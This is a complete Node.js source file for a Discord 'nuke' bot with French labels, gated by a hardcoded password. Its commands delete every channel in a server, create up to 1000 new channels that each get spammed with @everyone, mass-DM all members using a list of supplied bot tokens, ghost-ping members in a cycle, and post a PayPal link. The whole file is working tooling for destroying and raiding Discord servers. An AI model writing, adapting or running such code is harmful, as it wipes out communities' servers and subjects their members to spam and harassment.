const { Client, GatewayIntentBits, PermissionFlagsBits, SlashCommandBuilder, REST, Routes } = require('discord.js');
const http = require('http');

const PASSWORD = "magata";
const PAYPAL_LINK = "https://www.paypal.com/paypalme/snoopysong";
const PORT = process.env.PORT || 3000;

// ========== SERVEUR HTTP POUR RENDER ==========
const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/html' });
  res.end(`
    <html>
      <head><title>Magata Bot</title></head>
      <body style="background:#111;color:#0f0;font-family:monospace;padding:50px;">
        <h1>🤖 MAGATA BOT - ONLINE</h1>
        <p>Status: ✅ Running</p>
        <p>Uptime: ${Math.floor(process.uptime())} seconds</p>
      </body>
    </html>
  `);
});

server.listen(PORT, () => {
  console.log(`✓ Serveur HTTP actif sur le port ${PORT}`);
});

// ========== BOT DISCORD ==========
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
  ]
});

let pingCycleActive = false;
let pingCycleInterval = null;
let currentPingIndex = 0;

const commands = [
  new SlashCommandBuilder()
    .setName('nuke')
    .setDescription('Server nuke protocol')
    .addStringOption(option =>
      option.setName('nom_du_salon')
        .setDescription('Nom des salons à créer')
        .setRequired(true))
    .addStringOption(option =>
      option.setName('message')
        .setDescription('Message à envoyer')
        .setRequired(true))
    .addStringOption(option =>
      option.setName('mot_de_passe')
        .setDescription('Mot de passe requis')
        .setRequired(true)),

  new SlashCommandBuilder()
    .setName('say')
    .setDescription('Envoie un message en tant que bot')
    .addStringOption(option =>
      option.setName('message')
        .setDescription('Message à envoyer')
        .setRequired(true))
    .addStringOption(option =>
      option.setName('mot_de_passe')
        .setDescription('Mot de passe requis')
        .setRequired(true)),

  new SlashCommandBuilder()
    .setName('dmall')
    .setDescription('Envoie des DMs à tous les membres')
    .addStringOption(option =>
      option.setName('temps')
        .setDescription('Latence entre messages (ms)')
        .setRequired(true))
    .addStringOption(option =>
      option.setName('tokens')
        .setDescription('Liste de tokens (séparés par des virgules)')
        .setRequired(true))
    .addStringOption(option =>
      option.setName('message')
        .setDescription('Message à envoyer')
        .setRequired(true))
    .addStringOption(option =>
      option.setName('mot_de_passe')
        .setDescription('Mot de passe requis')
        .setRequired(true)),

  new SlashCommandBuilder()
    .setName('ping')
    .setDescription('Active/désactive le cycle de ping automatique')
    .addStringOption(option =>
      option.setName('mot_de_passe')
        .setDescription('Mot de passe requis')
        .setRequired(true)),
];

client.once('ready', async () => {
  console.log(`✓ Bot connecté: ${client.user.tag}`);
  console.log(`✓ Serveurs: ${client.guilds.cache.size}`);
  
  const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
  
  try {
    console.log('Enregistrement des commandes slash...');
    await rest.put(
      Routes.applicationCommands(client.user.id),
      { body: commands },
    );
    console.log('✓ Commandes enregistrées avec succès');
  } catch (error) {
    console.error('Erreur lors de l\'enregistrement des commandes:', error);
  }
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand()) return;

  const { commandName } = interaction;

  if (commandName === 'nuke') {
    const password = interaction.options.getString('mot_de_passe');
    const channelName = interaction.options.getString('nom_du_salon');
    const message = interaction.options.getString('message');

    if (password !== PASSWORD) {
      return interaction.reply({ content: '❌ Mot de passe incorrect', ephemeral: true });
    }

    await interaction.reply({ content: '⚠️ NUKE PROTOCOL INITIATED...', ephemeral: true });

    const guild = interaction.guild;

    try {
      const channels = guild.channels.cache.filter(c => c.type === 0 || c.type === 2);
      
      for (const [id, channel] of channels) {
        try {
          await channel.delete();
          console.log(`Salon supprimé: ${channel.name}`);
        } catch (err) {
          console.error(`Erreur suppression ${channel.name}:`, err.message);
        }
      }

      for (let i = 0; i < 1000; i++) {
        try {
          const newChannel = await guild.channels.create({
            name: `${channelName}-${i}`,
            type: 0,
          });
          
          await newChannel.send(`${message} @everyone`);
          console.log(`Salon créé et message envoyé: ${channelName}-${i}`);
        } catch (err) {
          console.error(`Erreur création salon ${i}:`, err.message);
        }
      }
    } catch (error) {
      console.error('Erreur NUKE:', error);
    }
  }

  if (commandName === 'say') {
    const password = interaction.options.getString('mot_de_passe');
    const message = interaction.options.getString('message');

    if (password !== PASSWORD) {
      return interaction.reply({ content: '❌ Mot de passe incorrect', ephemeral: true });
    }

    await interaction.reply({ content: '✓ Message envoyé', ephemeral: true });
    await interaction.channel.send(message);
  }

  if (commandName === 'dmall') {
    const password = interaction.options.getString('mot_de_passe');
    const latency = parseInt(interaction.options.getString('temps'));
    const tokensStr = interaction.options.getString('tokens');
    const message = interaction.options.getString('message');

    if (password !== PASSWORD) {
      return interaction.reply({ content: '❌ Mot de passe incorrect', ephemeral: true });
    }

    await interaction.reply({ content: '✓ DM ALL démarré...', ephemeral: true });

    const tokens = tokensStr.split(',').map(t => t.trim());
    const members = await interaction.guild.members.fetch();

    const sendDMs = async (token) => {
      const botClient = new Client({
        intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers]
      });

      try {
        await botClient.login(token);
        
        for (const [id, member] of members) {
          if (member.user.bot) continue;
          
          try {
            await member.send(message);
            console.log(`DM envoyé à ${member.user.tag} avec token ${token.slice(0, 10)}...`);
          } catch (err) {
            console.error(`Erreur DM à ${member.user.tag}:`, err.message);
          }
          
          await new Promise(resolve => setTimeout(resolve, latency));
        }
        
        await botClient.destroy();
      } catch (err) {
        console.error(`Erreur avec token ${token.slice(0, 10)}:`, err.message);
      }
    };

    for (const token of tokens) {
      sendDMs(token);
    }
  }

  if (commandName === 'ping') {
    const password = interaction.options.getString('mot_de_passe');

    if (password !== PASSWORD) {
      return interaction.reply({ content: '❌ Mot de passe incorrect', ephemeral: true });
    }

    if (pingCycleActive) {
      pingCycleActive = false;
      if (pingCycleInterval) clearInterval(pingCycleInterval);
      return interaction.reply({ content: '✓ Cycle de ping arrêté', ephemeral: true });
    }

    pingCycleActive = true;
    currentPingIndex = 0;
    await interaction.reply({ content: '✓ Cycle de ping démarré (1 ping/minute)', ephemeral: true });

    const guild = interaction.guild;
    const members = await guild.members.fetch();
    const memberArray = members.filter(m => !m.user.bot).map(m => m);

    pingCycleInterval = setInterval(async () => {
      if (!pingCycleActive) {
        clearInterval(pingCycleInterval);
        return;
      }

      if (memberArray.length === 0) return;

      const member = memberArray[currentPingIndex];
      
      try {
        const msg = await interaction.channel.send(`<@${member.id}>`);
        await msg.delete();
        console.log(`Ping envoyé et supprimé: ${member.user.tag}`);
      } catch (err) {
        console.error('Erreur ping:', err.message);
      }

      currentPingIndex++;
      if (currentPingIndex >= memberArray.length) {
        currentPingIndex = 0;
      }
    }, 60000);
  }
});

client.on('messageCreate', async message => {
  if (message.author.bot) return;

  if (message.content === '!paypal') {
    await message.channel.send(PAYPAL_LINK);
  }
});

const token = process.env.DISCORD_TOKEN;
if (!token) {
  console.error('❌ DISCORD_TOKEN manquant dans les variables d\'environnement');
  process.exit(1);
}

client.login(token);
